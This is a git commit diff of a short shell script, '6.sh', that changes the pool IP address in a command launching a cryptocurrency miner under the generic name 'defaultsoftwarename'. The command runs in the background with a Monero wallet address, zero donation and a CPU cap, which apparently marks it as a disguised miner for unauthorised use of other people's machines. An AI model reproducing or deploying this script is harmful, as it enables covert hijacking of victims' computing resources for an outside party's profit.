4d2c4982c0926ba3b8be1e731a20bf5c30cae7a1
uvajenie <58940226+uvajenie@users.noreply.github.com>
2019-12-18 10:50:18 -0800

    Update 6.sh

--- 6.sh
+++ 6.sh
@@ -1,3 +1,3 @@
 pkill defaultsoftwarename
 sleep 7
-defaultsoftwarename -o 51.161.104.94:49228 -u 42mFJRYestK5mdjgBtskMHcjGsNJR6NLaa7oZMNyxuAWQLsNTo8pCVvU63E5GAg5pUPErcADggW5NGLmQFVPQDcSAEvbpsr --pass=x:uvajenie@protonmail.com --rig-id=03 -B --donate-level=0 --print-time=30 --threads=defaultthreads --cpu-priority=4 --background --max-cpu-usage=81 --av=1
+defaultsoftwarename -o 51.161.104.86:49228 -u 42mFJRYestK5mdjgBtskMHcjGsNJR6NLaa7oZMNyxuAWQLsNTo8pCVvU63E5GAg5pUPErcADggW5NGLmQFVPQDcSAEvbpsr --pass=x:uvajenie@protonmail.com --rig-id=03 -B --donate-level=0 --print-time=30 --threads=defaultthreads --cpu-priority=4 --background --max-cpu-usage=81 --av=1
